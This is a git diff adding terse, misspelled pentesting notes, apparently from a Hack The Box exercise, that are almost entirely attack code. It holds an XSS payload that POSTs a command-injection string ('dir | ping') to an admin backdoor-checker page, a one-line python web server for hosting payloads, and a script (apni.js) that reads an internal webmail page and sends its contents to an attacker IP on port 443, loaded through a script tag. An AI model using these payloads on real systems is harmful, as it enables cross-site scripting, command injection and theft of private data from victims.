@@ -985,5 +985,30 @@ $.ajax({
 });
 </script>
 ```
+-
+>xss steall cookie
+> python
+```
+var http = new XMLHttpRequest();
+var url = 'http://127.0.0.1/admin/backdoorchecker.php';
+var params = 'orem=dir | ping -n 5 10.10.14.8';
+http.open('POST', url, true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.withCredentials = true;
+http.send(params);
+```
+>file.js
+>next
+```
+python3 -m http.server -m 80
+```
+---
+> way next
+```
+//apni.js var url="http://mail.stacked.htb/"  //targeturl(internal wep application) var xhr=new XMLHttpRequest();  xhr.open("GET", url, false);  xhr.send(); var resp=xhr.responseText; //transferring HTTP response to us var xhr2=new XMLHttpRequest();  xhr2.open("POST", 'http://10.10.14.89:443/', false); xhr2.send(resp);
+```
+```
+<script src="http://10.10.14.89/apni.js"></script>
+```
 
 
